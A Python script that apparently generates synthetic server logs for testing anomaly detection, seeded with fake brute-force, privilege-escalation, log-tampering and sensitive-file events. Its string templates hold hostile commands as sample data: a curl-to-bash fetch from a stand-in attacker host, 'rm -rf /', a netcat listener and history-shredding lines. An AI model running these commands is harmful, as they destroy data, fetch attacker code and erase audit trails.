#!/usr/bin/env python3
"""
generate_sample_log.py — Advanced Stress-Test Data Generator

Generates high-volume log files with specific security anomalies:
- Privilege Escalation (sudo/su abuse)
- Log Tampering/Deletion (clearing histories)
- Unusual Access (Sensitive file access)
- Brute Force & Spike Activity
- Deliberate Time Gaps
"""

import argparse
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path

# --- Constants & Templates ---

_SENSITIVE_FILES = ["/etc/shadow", "/etc/passwd", "/root/.ssh/authorized_keys", "/var/lib/mysql", "/etc/sudoers"]
_UNAUTHORIZED_CMDS = ["rm -rf /", "nmap -sS 10.0.0.0/24", "netcat -l -p 4444", "curl http://attacker.com/exploit.sh | bash"]
_ADMIN_USERS = ["root", "admin", "skyler", "sysop"]
_MALICIOUS_IPS = ["194.26.135.21", "185.220.101.35", "45.155.205.233"]

# --- Formatter & Scenario Logic ---c

def get_iso_ts(dt):
    return dt.isoformat(timespec='milliseconds') + "Z"

def get_syslog_ts(dt):
    return dt.strftime('%b %d %H:%M:%S')

def log_tampering(dt):
    user = random.choice(_ADMIN_USERS)
    cmds = ["history -c", "rm /var/log/auth.log", "shred -u ~/.bash_history"]
    return f"{get_syslog_ts(dt)} server-01 sudo: {user} : TTY=pts/0 ; COMMAND={random.choice(cmds)}"

def priv_escalation(dt):
    user = random.choice(["guest", "www-data", "temp"])
    return f"{get_syslog_ts(dt)} server-01 su: pam_unix(su:auth): authentication failure; logname= uid=1001 euid=0 tty=pts/1 ruser={user} rhost= user=root"

def sensitive_access(dt):
    file = random.choice(_SENSITIVE_FILES)
    return f"{get_iso_ts(dt)} [SECURITY] Unauthorized access attempt: {file} by user 'www-data' (PID: {random.randint(1000, 9999)})"

def service_crash(dt):
    svc = random.choice(["apache2", "mysql", "docker", "ssh"])
    return f"{get_syslog_ts(dt)} server-01 systemd[1]: {svc}.service: Main process exited, code=dumped, status=11/SEGV"

def unauthorized_cmd(dt):
    user = random.choice(_ADMIN_USERS)
    return f"{get_syslog_ts(dt)} server-01 sudo: {user} : TTY=pts/2 ; COMMAND={random.choice(_UNAUTHORIZED_CMDS)}"

def bruteforce(dt):
    ip = random.choice(_MALICIOUS_IPS)
    user = random.choice(["root", "admin", "postgres"])
    return f"{get_syslog_ts(dt)} server-01 sshd[{random.randint(10000, 99999)}]: Failed password for {user} from {ip} port {random.randint(1024, 65535)} ssh2"

# Map types to functions
SCENARIOS = {
    "tampering": log_tampering,
    "escalation": priv_escalation,
    "sensitive": sensitive_access,
    "crash": service_crash,
    "unauthorized": unauthorized_cmd,
    "bruteforce": bruteforce
}

# --- Core Generator ---

def generate_log(args):
    out_path = Path(args.output)
    n_lines = args.lines
    current_dt = datetime.now() - timedelta(days=1)
    
    # Setup types
    active_types = list(SCENARIOS.keys()) if "all" in args.types else args.types
    gap_set = set(random.sample(range(n_lines), args.gaps))
    anomaly_set = set(random.sample(range(n_lines), int(n_lines * 0.05))) # 5% are anomalies

    injected_gaps = []

    with out_path.open("w", encoding="utf-8") as f:
        for i in range(n_lines):
            # Normal time progression
            jitter = random.randint(1, args.interval)
            current_dt += timedelta(seconds=jitter)

            # Inject Gap
            if i in gap_set:
                current_dt += timedelta(seconds=args.gap_size)
                injected_gaps.append((i + 1, args.gap_size))

            # Decide line content
            if i in anomaly_set and active_types:
                scenario = random.choice(active_types)
                line = SCENARIOS[scenario](current_dt)
            else:
                # Default boring log line
                line = f"{get_iso_ts(current_dt)} [INFO] System heartbeat - Load Average: {random.uniform(0.1, 1.5):.2f}"

            f.write(line + "\n")
    
    return injected_gaps

# --- CLI ---

def main():
    parser = argparse.ArgumentParser(description="Generate 100k+ lines of evidence for testing.")
    parser.add_argument("-o", "--output", default="stress_test.log")
    parser.add_argument("-n", "--lines", type=int, default=100000)
    parser.add_argument("--gaps", type=int, default=10)
    parser.add_argument("--gap-size", type=int, default=3600, help="Gap in seconds")
    parser.add_argument("--interval", type=int, default=2, help="Max seconds between lines")
    parser.add_argument("--types", nargs="+", default=["all"], 
                        choices=["all", "tampering", "escalation", "sensitive", "crash", "unauthorized", "bruteforce"])

    args = parser.parse_args()

    print(f"🚀 Generating {args.lines} lines to {args.output}...")
    gaps = generate_log(args)
    
    print(f"✅ Finished. Injected {len(gaps)} major gaps.")
    for line, sec in gaps:
        print(f"   - Line {line}: {sec/60:.1f} minute gap")

if __name__ == "__main__":
    main()